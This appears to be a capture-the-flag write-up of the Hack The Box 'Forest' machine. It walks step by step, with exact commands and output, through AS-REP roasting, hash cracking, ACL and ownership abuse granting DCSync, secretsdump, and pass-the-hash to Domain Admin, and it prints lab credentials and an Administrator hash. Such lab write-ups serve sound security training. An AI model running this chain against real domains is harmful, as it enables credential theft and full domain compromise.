---
title: "HTB Forest Writeup"
date: 2026-06-23
tags: [oscp, active-directory, pentest]
---

## Summary

Forest is a beginner-friendly Active Directory machine that demonstrates several fundamental attack techniques:

- Anonymous SMB enumeration
- User enumeration
- AS-REP Roasting
- BloodHound attack path analysis
- Abuse of delegated permissions
- DCSync
- Pass-the-Hash

The initial foothold is obtained through AS-REP Roasting against a service account with Kerberos pre-authentication disabled. After gaining access, BloodHound reveals a privilege escalation path that ultimately leads to Domain Admin privileges.

---

# Reconnaissance

## Port Scan

I started with a full TCP scan:

```bash
nmap -sCV -vv --disable-arp-ping --min-rate 5000 -p- 10.129.20.146 -oN fullport.nmap
```

### Key Findings

Several ports immediately suggested an Active Directory environment:

| Port | Service |
|--------|--------|
| 53 | DNS |
| 88 | Kerberos |
| 389 | LDAP |
| 445 | SMB |
| 5985 | WinRM |

The scan also revealed the hostname:

```text
Host: FOREST
Domain: htb.local
```

At this point the target was clearly identified as a Domain Controller.

---

# SMB Enumeration

## Anonymous Access

I tested anonymous SMB authentication:

```bash
nxc smb 10.129.20.146 -u '' -p ''
```

Result:

```text
Null Auth: True
```

Anonymous access was enabled.

## User Enumeration

Using the anonymous session, I enumerated domain users:

```bash
nxc smb 10.129.20.146 -u '' -p '' --users
```

Interesting accounts included:

```text
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

I extracted the usernames into a file:

```bash
nxc smb 10.129.20.146 -u '' -p '' --users | awk 'NR>7 {print $5}' > ad_users.txt
```

---

# AS-REP Roasting

Since valid usernames were available, I checked for accounts with Kerberos pre-authentication disabled.

```bash
kerbrute userenum -d htb.local --dc 10.129.20.146 ad_users.txt
```

Output:

```text
svc-alfresco has no pre auth required
```

This immediately indicated an AS-REP Roasting opportunity.

## Obtaining the AS-REP Hash

```bash
impacket-GetNPUsers htb.local/''@10.129.20.146 -usersfile ad_users.txt
```

The tool returned a hash for:

```text
svc-alfresco
```

## Cracking the Hash

I used Hashcat with the RockYou wordlist:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
svc-alfresco : s3rvice
```

---

# BloodHound Enumeration

Using the newly obtained credentials:

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.20.146 -c all --zip
```

After importing the data into BloodHound, I reviewed the attack paths.

## Initial Access

BloodHound revealed that `svc-alfresco` belonged to:

```text
Remote Management Users
```

This allowed remote access through WinRM.

---

# User Access

Using Evil-WinRM:

```bash
evil-winrm -i 10.129.20.146 -u svc-alfresco -p s3rvice
```

After logging in, I retrieved the user flag.

---

# Privilege Escalation

## Attack Path Analysis

The shortest path to Domain Admin privileges was:

```text
svc-alfresco
    ->
Service Accounts
    ->
Privileged IT Accounts
    ->
Account Operators
    ->
Exchange Windows Permissions
    ->
WriteDACL
    ->
HTB.LOCAL
```

This path ultimately allowed control over the domain object.

---

## Adding svc-alfresco to Exchange Windows Permissions

```bash
net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U "HTB.LOCAL/svc-alfresco%s3rvice" -S 10.129.20.146
```

Verification:

```bash
net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U "HTB.LOCAL/svc-alfresco%s3rvice" -S 10.129.20.146
```

Output:

```text
HTB\Exchange Trusted Subsystem
HTB\svc-alfresco
```

---

## Attempting WriteDACL Abuse

I initially attempted to grant DCSync permissions directly:

```bash
impacket-dacledit -action write -rights DCSync -principal svc-alfresco -target-dn 'DC=HTB,DC=LOCAL' 'htb.local/svc-alfresco:s3rvice'
```

However, Active Directory returned:

```text
INSUFF_ACCESS_RIGHTS
```

Although BloodHound showed a valid attack path, the operation failed due to insufficient permissions.

---

## Taking Ownership of Exchange Windows Permissions

To proceed, I first changed the owner of the group:

```bash
impacket-owneredit -action write -new-owner svc-alfresco -target "EXCHANGE WINDOWS PERMISSIONS" 'htb.local/svc-alfresco:s3rvice' -dc-ip 10.129.20.146
```

Output:

```text
OwnerSid modified successfully!
```

---

## Granting Full Control

Next, I granted FullControl permissions over the group:

```bash
impacket-dacledit -action write -rights FullControl -principal svc-alfresco -target "EXCHANGE WINDOWS PERMISSIONS" 'htb.local/svc-alfresco:s3rvice'
```

Output:

```text
DACL modified successfully!
```

---

## Granting DCSync Rights

After obtaining full control, I retried the DCSync permission assignment:

```bash
impacket-dacledit -action write -rights DCSync -principal svc-alfresco -target-dn 'DC=HTB,DC=LOCAL' 'htb.local/svc-alfresco:s3rvice'
```

This time the operation succeeded.

---

# DCSync

With replication privileges granted, I dumped the domain secrets:

```bash
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.20.146
```

Among the dumped hashes:

```text
Administrator:32693b11e6aa90eb43d32c72a07ceea6
```

---

# Administrator Access

Using Pass-the-Hash:

```bash
evil-winrm -i 10.129.20.146 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

After authentication, I retrieved the root flag.

---

# Conclusion

Forest is an excellent introduction to Active Directory privilege escalation.

The complete attack chain was:

1. Anonymous SMB enumeration
2. User enumeration
3. AS-REP Roasting
4. Password cracking
5. BloodHound privilege path discovery
6. Group ownership abuse
7. ACL abuse
8. DCSync
9. Pass-the-Hash

A single service account misconfiguration ultimately resulted in full domain compromise.
